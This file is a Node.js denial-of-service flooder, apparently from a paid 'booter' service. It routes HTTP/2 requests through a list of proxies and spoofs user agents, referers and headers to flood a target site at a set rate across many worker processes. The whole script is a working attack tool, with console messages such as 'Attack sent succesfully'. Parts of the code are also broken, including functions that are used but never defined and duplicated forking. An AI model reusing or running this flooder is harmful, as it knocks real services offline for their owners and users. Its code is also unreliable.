const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 

 const accept_header = [
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.0.1633 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36 OPR/43.0.2442.806 (Edition Yx)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.0.2034 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; thl T9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G925I Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Micromax Q334 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; PowerFive Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; TZ707 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; 9005X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 YaBrowser/16.10.2.1487.00 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
"Mozilla/5.0 (Android 5.0; Mobile; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 () AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",];

referers = [
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
];
lang_header = [
    'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5',
    'en-US,en;q=0.9',
    'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7',
    'cs;q=0.5', 
    'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7', 'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7', 'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7', 'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6', 'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7', 'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7', 'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',   'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5', 'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7', 'da, en-gb;q=0.8, en;q=0.7', 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'
];
encoding_header = [
    'deflate, gzip;q=1.0, *;q=0.5',
    'gzip, deflate, br',
    '*'
];
controle_header = [
    'no-cache',
    'no-store',
    'no-transform',
    'only-if-cached',
    'max-age=0'
];



 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){
 console.log(`██╗     ███████╗██╗   ██╗██╗   ██╗██╗  ██╗ `);
 console.log(`██║     ██╔════╝██║   ██║╚██╗ ██╔╝╚██╗██╔╝ `);
 console.log(`██║     █████╗  ██║   ██║ ╚████╔╝  ╚███╔╝ `);
 console.log(`██║     ██╔══╝  ╚██╗ ██╔╝  ╚██╔╝   ██╔██╗ `);
 console.log(`███████╗███████╗ ╚████╔╝    ██║   ██╔╝ ██╗`);
 console.log(`╚══════╝╚══════╝  ╚═══╝     ╚═╝   ╚═╝  ╚═╝`);
 console.log(`node TLSX.js [TARGET] [TIME] [RATE] [THREAD] [http.txt] `); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 const args = {
     target: process.argv[2],
     time: process.argv[3],
     Rate: process.argv[4],
     threads: process.argv[5],
     proxyFile: process.argv[6]
 }
 var proxies = fs.readFileSync('http.txt', 'utf-8').toString().replace(/\r/g, '').split('\n');
 const parsedTarget = url.parse(args.target);



if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.log(`[Broadcast] SUCCES: Attack sent succesfully `);
    console.log('[Broadcast] Target: ' + parsedTarget.host + '\x1b[0m');
    console.log('[Broadcast] Duration: ' + args.time + '\x1b[0m');
    console.log('[Broadcast] Threads: ' + args.threads + '\x1b[0m');
    console.log('[Broadcast] Requests per second: ' + args.Rate + '\x1b[0m');
    console.log(`[Broadcast] Status: Succes!`);
    console.log(``);
    console.log(`Congrats you have just earned 1 credit`);

  setTimeout(() => {
    process.exit(1);
  }, process.argv[3] * 1000);

} 

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder)
}
    setTimeout(function(){

      process.exit(1);
    }, process.argv[3] * 1000);
    
    process.on('uncaughtException', function(er) {
    });
    process.on('unhandledRejection', function(er) {
    });

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split("https://");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true,
        });

        connection.setTimeout(options.timeout * 10 * 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === true) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

    }
}

const osList = [
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.0.1633 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36 OPR/43.0.2442.806 (Edition Yx)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.0.2034 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; thl T9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G925I Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Micromax Q334 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; PowerFive Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; TZ707 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; 9005X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 YaBrowser/16.10.2.1487.00 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
"Mozilla/5.0 (Android 5.0; Mobile; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 () AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
];

const UAs = [
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0",
"Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
"Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 YaBrowser/17.6.0.1633 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36 OPR/43.0.2442.806 (Edition Yx)",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 YaBrowser/17.1.0.2034 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.100 YaBrowser/16.11.1.673 Yowser/2.5 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.94",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0; thl T9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.85 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G925I Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; Redmi Note 3 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.1; Micromax Q334 Build/LMY47I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 5.0; PowerFive Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; MFLogin3T Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.135 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; TZ707 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; 9005X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-E455 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 YaBrowser/16.10.2.1487.00 Mobile Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 5_0_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A405 Safari/7534.48.3",
"Mozilla/5.0 (Android 5.0; Mobile; rv:38.0) Gecko/20100101 Firefox/38.0",
"Mozilla/5.0 () AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
];
function getRandomUserAgent() {
    const osList = ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Macintosh', 'Android', 'Linux'];
    const browserList = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Tor'];
    const languageList = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'en-id'];
    const countryList = ['US', 'GB', 'FR', 'DE', 'ES', 'ID'];
    const manufacturerList = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];
    const version = Math.floor(Math.random() * 100) + 1;
    const randomOrder = Math.floor(Math.random() * 6) + 1;
    const userAgentString = `${manufacturer}/${browser} ${version}.${version}.${version} (${os}; ${country}; ${language})`;
    const encryptedString = btoa(userAgentString);
    let finalString = '';
    for (let i = 0; i < encryptedString.length; i++) {
      if (i % randomOrder === 0) {
        finalString += encryptedString.charAt(i);
      } else {
        finalString += encryptedString.charAt(i).toUpperCase();
      }
    }
    return finalString;
  }


  const Header = new NetSocket();
  headers[":method"] = "GET";
  headers[":path"] = parsedTarget.path;
  headers[":scheme"] = "HTTP/1.1";
  headers[":authority"] = randomString(10) + "." + parsedTarget.host;
  headers["accept"] = randomHeaders['accept'];
  headers["Accept-Encoding"] = "gzip, deflate, br";
  headers["accept-language"] = headerFunc.lang();
  headers["accept-encoding"] = headerFunc.encoding();
  headers["Connection"] = Math.random() > 10000 ? "keep-alive" : "close";
  headers["upgrade-insecure-requests"] = Math.random() > 10000;
  headers["x-requested-with"] = "XMLHttpRequest";
  headers["pragma"] = Math.random() > 10000 ? "no-cache" : "max-age=0";
  headers["cache-control"] = Math.random() > 10000 ? "no-cache" : "max-age=0";

 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");
     headers[":authority"] = parsedTarget.host
     headers["user-agent"] = getRandomUserAgent();
 
     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100
     };

     Header.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 10000);

         const tlsOptions = {
            ALPNProtocols: ['h2', 'http/1.1'],
            echdCurve: "GREASE:X25519:x25519",
            ciphers:     "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
            rejectUnauthorized: false,
            socket: connection,
            honorCipherOrder: true,
            secure: true,
            port: 443,
            uri: parsedTarget.host,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                           crypto.constants.SSL_OP_NO_TICKET |
                           crypto.constants.SSL_OP_NO_COMPRESSION |
                           crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                           crypto.constants.SSL_OP_NO_SSLv2 |
                           crypto.constants.SSL_OP_NO_SSLv3 |
                           crypto.constants.SSL_OP_NO_TLSv1 |
                           crypto.constants.SSL_OP_NO_TLSv1_1,
          };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 30 * 1000000);
 
         const client = http2.connect(parsedTarget.href, {
             protocol: "https://",
             settings: {
            headerTableSize: 7949676499,
            maxConcurrentStreams: 7949676499,
            initialWindowSize: 7949676499 * 7949676499,
            maxHeaderListSize: 7949676499 * 7949676499,
            enablePush: false
          },
             maxSessionMemory: 7949676499,
             maxDeflateDynamicTableSize: 7949676499,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 7949676499,
            maxConcurrentStreams: 7949676499,
            initialWindowSize: 7949676499,
            maxHeaderListSize: 7949676499,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(headers)
                    
                    .on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
 
         client.on("error", error => {
             client.destroy();
             connection.destroy();
             return
         });
     });
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);